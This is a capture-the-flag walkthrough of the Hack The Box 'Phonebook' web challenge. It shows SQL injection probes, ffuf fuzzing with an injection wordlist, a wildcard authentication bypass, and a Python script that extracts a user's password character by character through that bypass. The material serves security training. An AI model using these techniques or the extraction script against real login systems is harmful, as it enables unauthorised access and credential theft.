# Phonebook

Phonebook is currently active (Oct 2021) and worth 30 points. See: https://app.hackthebox.eu/challenges/phonebook

### First Take

I started up the challenge and visited the website. It is a small login form.

![start](/home/kali/Box_Notes/Challenges/Phonebook/start.png)

Looks pretty typical. Checking the source code for another look reveals a conspicuous little script: 

```html
<script>
  const queryString = window.location.search;
if (queryString) {
  const urlParams = new URLSearchParams(queryString);
  const message = urlParams.get('message');
  if (message) {
    document.getElementById("message").innerHTML = message;
    document.getElementById("message").style.visibility = "visible";
    }
  }
</script>
```

What could be the point of this? I tried navigating to http://139.59.183.98:31487/login?message=What%20can%20go%20here. Lo and behold:

![form abuse](/home/kali/Box_Notes/Challenges/Phonebook/form abuse.png)

Ok, that is interesting. So the site might be vulnerable to XSS. However, this does not provide us a way in (We're in a docker container: there are no other users, so nobody to target for XSS). I might come back and play with this a bit.



### The Login Form

There is clearly a hint right on the form

> "You can now login using the workstation username and password! - Reese".

...maybe the workstation username is some kind of mangling of *reese* or *phonebook* then?

- admin    :    admin
- reese    :    reese
- phonebook    :    phonebook

Best not to get too specific right up front. Let's try some low-hanging fruit for auth bypass first. One of the first things any tester should do is attempt the most basic sql injections, just to see if it is worth pursuing. I tried the singlequote, doublequote, and an backslash-escaped version of each. **Got a 500 Internal Server Error** (a very good sign that SQLi may be possible) from the following:

![image-20211007141333993](/home/kali/.config/Typora/typora-user-images/image-20211007141333993.png)

SQLi may be possible, so next I tried the 

- admin' or '1'='1    :    pass
- admin')-- -     :    pass
- admin' or 1=1 --     :    pass

No luck!



Lets do the above, but much deeper, using sqlmap:

`sqlmap -u http://159.65.59.85:31911 --forms --crawl=2`

This returned no results, even though it seemed like it was working properly. I also tried modifying the POST data to include the usernames *admin*, *reese*, and *phonebook* (instead of guessing values on both parameters), and still no luck.

At this point I started wondering why I was having no result. Was it because of the string escaping? The singlequote only worked once it was backslash escaped, so perhaps the SQLi strings need proper escaping? Let's try the SQLi again, but this time with strings that we have ensured are urlencoded.



### URL-Encoded Login Form Fuzzing

Kali comes prepackaged with a wordlist suitable for fuzzing auth forms: **/usr/share/wordlists/wfuzz/Injections/All_attack.txt**. 

`WLIST=/usr/share/wordlists/wfuzz/Injections/All_attack.txt`

`ffuf -w $WLIST:FUZZ -u http://$RADDR/login  -X POST -d 'username=FUZZ&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -t 80 -c -o ffuf-output -of html -fc 307`  

As expected, this yields nothing. 

Let's try URL-encoding the whole wordlist

`cat $WLIST | perl -MURI::Escape -ne 'chomp;print uri_escape($_),"\n"' > ./urlencoded_wordlist.txt`   

`ENCLIST=./urlencoded_wordlist.txt`

`ffuf -w $ENCLIST:FUZZ -u http://$RADDR/login  -X POST -d 'username=FUZZ&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -t 80 -c -o ffuf-output -of html -fc 307`

![Screenshot 2021-10-07 14:28:22](/home/kali/Box_Notes/Challenges/Phonebook/Screenshot 2021-10-07 14:28:22.png)

That is a LOT of results. 

After running the above with a verbose flag, I realized that all of the **unsuccessful requests have the string "Authentication failed"**, so I filtered out that string from the result (filter the substring "fail"):

`ffuf -w $ENCLIST:FUZZ -u http://$RADDR/login  -X POST -d 'username=FUZZ&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -t 80 -c -o ffuf-output -of html -fc 307 -v -fr fail`

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       
    
       v1.3.1 Kali Exclusive <3
       
       
        :: Method           : POST
     :: URL              : http://159.65.59.85:31498/login
     :: Wordlist         : FUZZ: ./urlencoded_wordlist.txt
     :: Header           : Content-Type: application/x-www-form-urlencoded
     :: Data             : username=FUZZ&password=FUZZ
     :: Output file      : ffuf-output
     :: File format      : html
     :: Follow redirects : false
     :: Calibration      : false
     :: Timeout          : 10
     :: Threads          : 80
     :: Matcher          : Response status: 200,204,301,302,307,401,403,405
     :: Filter           : Response status: 307
     :: Filter           : Regexp: fail
    
    ________________________________________________
    
    [Status: 302, Size: 0, Words: 1, Lines: 1]                                                                                                                                                           
    | URL | http://159.65.59.85:31498/login
    | --> | /
        * FUZZ: %2A
    
    [Status: 302, Size: 0, Words: 1, Lines: 1]                                                                                                                                                           
    | URL | http://159.65.59.85:31498/login
    | --> | /login?message=Authentication%20Failed
    
       * FUZZ: 
Well that looks pretty definitive! 
We simply use %2A for both the username and password. This is the wildcard character (*). 

Success! We have bypassed the login and are in a phonebook app. 

![phonebook_app](/home/kali/Box_Notes/Challenges/Phonebook/phonebook_app.png)



### Phonebook App

The  source code reveals that the search bar is the only intended functionality.

```javascript
	function failure() {
      var content = '<p class="lead">No search results.</p>';
      $('#maindiv').append(content);
    };

    function success(data) {
      $("#maindiv").empty();

      if (data.length == 0) {
        failure();
        return;
      };

      var content = "<table>";
        data.forEach(function(item) {
          content += '<tr><td>' + item["cn"] + " " + item["sn"] + '</td><td>'+ item["mail"]  +'</td><td>'+ item["homePhone"] +'</td></tr>';
          console.log(item);
        });
      content += "</table>";
    $('#maindiv').append(content);
    };

    function search(form) {
      var searchObject = new Object();
      searchObject.term = $("#searchfield").val();
      $.ajax({
        type: "POST",
        url: "/search",
        data: JSON.stringify(searchObject),
        success: success,
        dataType: "json",
    });
    };
```

Switched over to Burpsuite to try different POSTs to the search endpoint

![image-20211007151207146](/home/kali/.config/Typora/typora-user-images/image-20211007151207146.png)

Note that it accepted the singlequote here as text. We can once again backslash-escape the quote for interesting results

`"\'"`   ==>   `"error":"invalid character '\\'' in string escape code"`

`"\\'"`   ==>   `"error":"Unexpected EOF"`

Unexpected EOF? That probably means we properly injected. I copied the above request into a new file PostRequest.txt, changed the value of "term" ("term":"a") to something that would yield a 200 status, then tried **sqlmap**: 

`sqlmap -r PostRequest.txt`

And, after much probing... sqlmap gave no actionable result.

There is still a piece of information that we've gathered but have not tried: why not try regexp stuff through the search field? It worked on the login page, so maybe it will work here too. A quick search for various terms with an asterisk yield exactly what we would expect: it treats it like * in regexp. Ex a search for "***skynet**" gives only reese@skynet.com.

Having no success in abusing the Phonebook search, I went back to the login form to see what else was possible.



### Login Form

The login form accepted the wildcard character credential * : *. But is that all it will accept? If the ***** is acting that way, we should be able to use the login form to check for any valid credentials. I.e we can check a sequence like the following, and finally fail on the last attempt.

> F*
>
> FU*
>
> FUL*
>
> ...
>
> FULLUSERNAME*

So by guessing and checking longer and longer substrings, we can find a valid credential. A bunch of matches followed by one mismatch would indicate the username is valid. 

I performed the auth bypass using * : *, and caught the request in Burp proxy. Burp allows you to convert an arbitrary request into a **cURL** command by right-clicking the POST. While this probably could have been done using some bash scripting and cURL, I am more comfortable in Python. 

> Check out this wonderful website that does the conversion of **cURL** to Python **Requests**: https://curl.trillworks.com/#python

To extract the first matching username, I wrote this script (based on the above Requests snippet):

```python
#!/bin/python3

import requests

matchCodes = [200,302]
filterLocation = ['ailed']

alphabet = [c for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_."]
maxLength = 40

headers = {
    'Host': '68.183.41.74:31495',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '21',
    'Origin': 'http://68.183.41.74:31495',
    'Connection': 'close',
    'Referer': 'http://68.183.41.74:31495/login',
    'Upgrade-Insecure-Requests': '1',
}

longstrings = []

def longestChildren(s):
    data = f'username={s}*&password=*'
    response = requests.post('http://68.183.41.74:31495/login', headers=headers, data=data, allow_redirects=False)
    # If this POST was unsuccessful, then this is not a valid substring.
    if (len(s) >= maxLength or response.status_code not in matchCodes):
        return
    # If the response contains any of the filter text, reject it
    for badStr in filterLocation:
        if response.headers['Location'].find(badStr) >= 0:
            return
    print(f"Found: {s}")
    if s[:-1] in longstrings:
        longstrings.remove(s[:-1])
    longstrings.append(s)
    for c in alphabet:
        longestChildren(s+c)

print('----------------------------------')

longestChildren('')
print("Completed. Matching substrings: ")
for s in longstrings:
    print(s)
```

Running the above script, the results should start rolling in...

![findingUser](/home/kali/Box_Notes/Challenges/Phonebook/findingUser.png)

Nice, we had expected to find Reese as a user, this confirms it.

Modify the above script: expand the alphabet (passwords can have a more characters, special characters, etc), and change which fields are used in the request

```python
alphabet = [c for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^()_+}{"]
...
data = f'username=REESE&password={s}*'
```

Run the modified script to extract the password (I have not shown the whole execution):

![findingPass](/home/kali/Box_Notes/Challenges/Phonebook/findingPass.png)

Excellent! Reese's password is clearly the HTB flag itself. By getting the rest the password, you will find the flag.



### Lessons to Remind Myself

> Consider escaping your go-to list of basic SQLi.

If you can figure out what the escape character is, this should be trivial.


> When you bypass auth, go back and find a real credential. 

Or at least remember to go back and find a credential once you have exhausted options that require a credential


> Spend your time writing enumeration scripts, instead of trying unlikely options.

It gets easier every time. Remember there are lots of tools to automate. 
